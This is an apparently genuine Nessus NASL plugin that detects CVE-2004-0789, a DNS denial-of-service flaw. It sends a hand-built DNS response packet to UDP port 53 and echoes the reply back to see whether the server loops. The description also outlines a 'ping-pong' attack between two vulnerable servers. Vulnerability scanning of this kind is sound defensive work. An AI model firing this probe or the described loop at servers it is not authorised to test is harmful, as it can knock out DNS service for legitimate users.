#
# Multiple Vendor DNS Response Flooding Denial Of Service
# NISCC Vulnerability Advisory 758884/NISCC/DNS
# http://www.uniras.gov.uk/vuls/2004/758884/index.htm
# by Cedric Tissieres <cedric dot tissieres at objectif-securite dot ch>
#
# Changes by Tenable:
# - Modified to slightly change the way the query is performed and the vulnerability is detected.
# - Added a Synopsis, CVSS score, modified the solution, and fixed the broken link
# - Plugin title changed (7/1/09)
#
# This script is released under the GNU GPLv2
#

include("compat.inc");

if(description)
{
 script_id(15753);
 script_version("$Revision: 1.11 $");

 script_cve_id("CVE-2004-0789");
 script_bugtraq_id(11642);
 script_xref(name:"OSVDB", value:"11575");

 script_name(english:"Multiple Vendor DNS Spoofed Query Packet Remote DoS");
 script_summary(english:"send malformed DNS query on port 53");

 script_set_attribute(attribute:"synopsis", value:
"The remote DNS server has a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"Multiple DNS vendors are reported susceptible to a denial of service 
attack (Axis Communication, dnrd, Don Moore, Posadis).

This vulnerability may result in a DNS server entering into an
infinite query and response message loop, leading to the consumption
of network and CPU resources, and denying DNS service to legitimate
users. 

An attacker may exploit this flaw by finding two vulnerable servers
and set up a 'ping-pong' attack between the two hosts.");
 script_set_attribute(attribute:"see_also", value:
"http://www.nessus.org/u?a04dcb96");
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for an appropriate upgrade.");
 script_set_attribute(attribute:"cvss_vector", value:
"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value:
"2004/11/18");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english: "DNS");
 script_copyright(english:"This script is Copyright (C) 2004-2009 Cedric Tissieres, Objectif Securite");
 script_require_ports(53);
 script_require_keys("DNS/udp/53");
 script_dependencies("dns_server.nasl");
 exit(0);
}

#
# The script code starts here
#


if ( islocalhost() ) exit(0);
if (! get_kb_item("Services/udp/dns") ) exit(0);

if(get_port_state(53))
{
   soc = open_sock_udp ( 53 );
   if ( ! soc ) exit(0);
   my_data = string("\xf2\xe7\x81\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77");
   my_data = my_data + string("\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00");
   my_data = my_data + string("\x00\x01\x00\x01");
   send(socket:soc, data:my_data);
   r = recv(socket:soc, length:4096);
   if ( r && ( ord(r[2]) & 0x80 ) ) 
   {
   send(socket:soc, data:r);
   r = recv(socket:soc, length:4096);
   if ( r && ( ord(r[2]) & 0x80 ) )  security_warning(port:53, proto:"udp");
   }
}
   
